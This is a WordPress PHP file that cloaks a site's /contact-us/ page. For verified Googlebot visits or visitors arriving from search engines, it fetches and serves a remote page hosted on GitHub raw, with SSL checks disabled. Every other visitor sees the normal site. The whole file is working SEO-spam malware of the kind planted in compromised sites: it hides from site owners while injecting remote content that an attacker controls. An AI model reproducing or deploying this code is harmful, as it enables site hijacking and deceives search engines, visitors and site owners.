<?php
if (!defined('ABSPATH')) exit;

class WP_Advanced_Cloaking {
    private $cloaking_rules = [];
    
    public function __construct() {
        $this->initialize_cloaking_rules();
        add_action('template_redirect', [$this, 'handle_cloaking'], 1);
    }
    
    private function initialize_cloaking_rules() {
        $this->cloaking_rules = [
            [
                'path' => '/contact-us/',
                'landing_page' => 'https://raw.githubusercontent.com/line66-cokang/portefeuille-txt/refs/heads/main/lp1',
                'remote_url' => ''
            ]
        ];
    }
    
    // Deteksi bot search engine via User-Agent
    private function isSearchEngineBot() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', $user_agent);
    }

    // Validasi khusus Googlebot asli via reverse DNS
    private function isRealGoogleBot() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) return false;

        $host = gethostbyaddr($ip);
        if (preg_match('/(\.googlebot\.com|\.google\.com)$/i', $host)) {
            return gethostbyname($host) === $ip;
        }
        return false;
    }

    // Deteksi referer dari Google
    private function isFromGoogle() {
        $referer = $_SERVER['HTTP_REFERER'] ?? '';
        return !empty($referer) && 
               (strpos($referer, 'google.') !== false ||
                strpos($referer, 'bing.') !== false ||
                strpos($referer, 'yahoo.') !== false);
    }

    // Fetch remote content
    private function NuLzFetch($url) {
        // SELURUHNYA PAKAI REMOTE FETCH - TIDAK ADA LAGI FILE LOKAL
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            // Method 1: cURL
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_TIMEOUT => 15,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                ]);
                
                $data = curl_exec($ch);
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                
                if ($http_code === 200 && $data) {
                    return $data;
                }
            }
            
            // Method 2: WordPress HTTP API
            $response = wp_remote_get($url, [
                'timeout' => 7,
                'sslverify' => false,
                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            ]);
            
            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
                return wp_remote_retrieve_body($response);
            }
        }
        
        return null;
    }

    // Gabung landing dengan remote
    private function getLandingWithRemote($landing_url, $remote_url) {
        // Ambil landing page dari server eksternal
        $landing = $this->NuLzFetch($landing_url);
        $remote = $this->NuLzFetch($remote_url);
        
        if (!$landing && !$remote) {
            return null;
        }
        
        if ($landing && $remote) {
            return $landing . "\n\n" . $remote;
        }
        
        // Fallback ke konten yang tersedia
        return $landing ?: $remote;
    }

    public function handle_cloaking() {
        // Skip jika bukan frontend
        if (is_admin() || wp_doing_cron() || wp_doing_ajax()) {
            return;
        }
        
        $current_path = $_SERVER['REQUEST_URI'] ?? '';
        
        // Cari rule yang match dengan path saat ini
        $matched_rule = null;
        foreach ($this->cloaking_rules as $rule) {
            if (strpos($current_path, $rule['path']) !== false) {
                $matched_rule = $rule;
                break;
            }
        }
        
        if (!$matched_rule) {
            return;
        }
        
        // === CLOAKING LOGIC ===
        $is_bot = $this->isSearchEngineBot();
        $is_real_googlebot = $this->isRealGoogleBot();
        $is_google_referer = $this->isFromGoogle();
        
        // Hanya Googlebot asli atau referer dari Google yang dapat cloaking
        if (($is_bot && $is_real_googlebot) || $is_google_referer) {
            $content = $this->getLandingWithRemote($matched_rule['landing_page'], $matched_rule['remote_url']);
            if ($content) {
                header('Content-Type: text/html; charset=UTF-8');
                header('X-Cloaking: Active');
                header('X-Landing-Source: External');
                echo $content;
                exit;
            }
        }
        
        // Visitor normal atau bot non-Google → TAMPILKAN HALAMAN WORDPRESS NORMAL
        return;
    }
}

new WP_Advanced_Cloaking();
